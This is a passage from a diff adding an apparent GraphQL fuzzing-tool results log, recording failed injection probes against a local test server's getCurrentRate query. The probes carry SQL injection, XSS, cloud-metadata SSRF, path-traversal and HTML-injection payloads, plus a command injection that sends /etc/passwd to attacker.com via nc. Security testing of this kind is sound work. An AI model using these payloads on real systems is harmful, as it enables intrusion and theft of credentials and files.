+              "stacktrace": [
+                "GraphQLError: Unknown argument \"invalidArg\" on field \"Query.getCurrentRate\".",
+                "    at Object.Argument (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/KnownArgumentNamesRule.js:46:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-07T02:32:55.353469Z",
+    "count": 87,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD' UNION SELECT * FROM currencies--\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:32:57.018656Z",
+    "count": 88,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"<script>alert(document.cookie)</script>\")\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-07T02:32:59.827057Z",
+    "count": 89,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"http://169.254.169.254/latest/meta-data\")\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:33:02.091401Z",
+    "count": 90,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD; cat /etc/passwd | nc attacker.com 4444\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:33:04.141140Z",
+    "count": 91,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"../../../etc/passwd\")\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:33:06.930956Z",
+    "count": 92,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"<h1>Hacked</h1><iframe src='evil.com'>\")\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-07T02:33:09.580932Z",
+    "count": 93,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\")\n  __typename\n  __schema {\n    queryType { name }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.012,
+        "timestamp": "2025-10-07T02:33:12.569071Z",
+        "response_body": {
+          "data": {
+            "getCurrentRate": null,
+            "__typename": "Query",
+            "__schema": {
+              "queryType": {
+                "name": "Query"
+              }
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-07T02:33:12.575143Z",
+        "response_body": {
+          "data": {
+            "rate": null,
+            "s": {
+              "t": {
+                "n": "Query"
+              }
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 94,
+    "timestamp": "2025-10-07T02:33:12.575217Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.009,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  rate: getCurrentRate(mainCurrencySymbol: \"USD\")\n  s: __schema {\n    t: queryType { n: name }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-07T02:33:14.552023Z",
+        "response_body": {
+          "data": {
+            "getCurrentRate": null,
+            "__typename": "Query",
+            "__schema": {
+              "queryType": {
+                "name": "Query"
+              }
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.004,
+        "timestamp": "2025-10-07T02:33:14.556315Z",
+        "response_body": {
+          "data": {
+            "rate": null,
+            "s": {
+              "t": {
+                "n": "Query"
+              }
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 95,
+    "timestamp": "2025-10-07T02:33:14.556336Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.012,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate {\n    types {\n      name\n      fields {\n        name\n        type {\n          name\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-07T02:33:17.437663Z",
+    "count": 96,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 18
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ScalarLeafsRule.js:33:33)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(name: \"Query\") {\n    fields {\n      name\n      args {\n        name\n        type {\n          name\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-07T02:33:19.806659Z",
+    "count": 97,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 33
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ScalarLeafsRule.js:33:33)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Unknown argument \"name\" on field \"Query.getCurrentRate\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 18
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Unknown argument \"name\" on field \"Query.getCurrentRate\".",
+                "    at Object.Argument (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/KnownArgumentNamesRule.js:46:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\")\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.004,
+    "timestamp": "2025-10-07T02:33:32.884725Z",
+    "count": 98,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD' UNION SELECT NULL--\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:33:35.883999Z",
+    "count": 99,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"<script>alert(1)</script>\")\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:33:38.591227Z",
+    "count": 100,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"http://internal-api:8080\", foreignCurrencySymbol: \"GBP\")\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:33:40.245188Z",
+    "count": 101,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD; nc 127.0.0.1 4444\", foreignCurrencySymbol: \"JPY\")\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.004,
+    "timestamp": "2025-10-07T02:33:42.063947Z",
+    "count": 102,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"../../etc/passwd\", foreignCurrencySymbol: \"CNY\")\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-07T02:33:44.173898Z",
+    "count": 103,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"<img src=x onerror=alert(1)>\")\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:33:46.586455Z",
+    "count": 104,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"EUR\", foreignCurrencySymbol: \"USD\")\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.009,
+        "timestamp": "2025-10-07T02:33:49.309373Z",
+        "response_body": {
+          "data": {
+            "getCurrentRate": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-07T02:33:49.315386Z",
+        "response_body": {
+          "data": {
+            "s": null,
+            "t": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 105,
+    "timestamp": "2025-10-07T02:33:49.315428Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.009,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  s: getCurrentRate(mainCurrencySymbol: \"GBP\", foreignCurrencySymbol: \"USD\")\n  t: getCurrentRate(mainCurrencySymbol: \"JPY\")\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-07T02:33:51.537023Z",
+        "response_body": {
+          "data": {
+            "getCurrentRate": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-07T02:33:51.542220Z",
+        "response_body": {
+          "data": {
+            "s": null,
+            "t": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 106,
+    "timestamp": "2025-10-07T02:33:51.542255Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.006,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate {\n    queryType { name }\n    mutationType { name }\n    types {\n      name\n      fields {\n        name\n        type { name }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-07T02:33:54.313626Z",
+    "count": 107,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 18
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ScalarLeafsRule.js:33:33)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
